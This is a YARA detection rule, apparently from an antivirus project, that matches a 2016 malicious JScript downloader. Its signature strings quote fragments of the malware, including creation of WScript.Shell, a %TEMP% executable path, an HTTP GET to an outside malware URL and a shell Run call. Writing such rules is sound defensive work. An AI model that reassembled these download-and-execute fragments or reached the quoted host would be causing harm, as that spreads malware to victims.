rule sig_20160328_a377595e2af2f99781863b56eaf6bedf {
  meta:
    description = "datamaliciousorder - file 20160328_a377595e2af2f99781863b56eaf6bedf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7ae1eb4b99eea7c5c83b26da8812ab24e5436af67a54e2c7d141a93f6ec2dabc"

  strings:
    $s1  = "function Juoyxgdq() {return Pgmikk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lNjpowCMVuhX.exe\";};" fullword ascii
    $s2  = "Sfxlwlc[Ecaulajis](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Mjsgazlu](Ceuezi() * 11)} while (Sfxlwlc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Pgmikk = function Lbflfyancn() {return WScript[Evqcewwpp](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tzpxj(Kcafa, Fyoejtmt){return Kcafa - Fyoejtmt;};" fullword ascii
    $s6  = "function Kfojqqqbii() {return ((Tyqpud == true) && (Tyqpud == Wiiikblu)) ? 1 : Ibknrav;};" fullword ascii
    $s7  = "function Nvgksgmfvw(Cnbfs){Pgmikk[\"Run\"](Cnbfs, Ibknrav, Ibknrav);};" fullword ascii
    $s8  = "function Ceuezi(){return 22;};" fullword ascii
    $s9  = "function Ijwlzv(Kqkexfzkde) {var Drtzovmd = (1, 2, 3, 4, 5, Kqkexfzkde); return Drtzovmd;};" fullword ascii
    $s10 = "var Smetozaque = false;" fullword ascii
    $s11 = "var Wiiikblu = false;" fullword ascii
    $s12 = "Tyqpud = true; " fullword ascii
    $s13 = " while (Tqibksd){" fullword ascii
    $s14 = "function Lzrpd(){return Sgauwve;};" fullword ascii
    $s15 = "var Eefkth = new this[\"Date\"]();" fullword ascii
    $s16 = "Wiiikblu = true; " fullword ascii
    $s17 = "function Bllzntwb()" fullword ascii
    $s18 = "return Tzpxj(Phleeyo, Pcdumcqse);" fullword ascii
    $s19 = "var Tyqpud = false;" fullword ascii
    $s20 = "function Mione(){return Evqcewwpp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}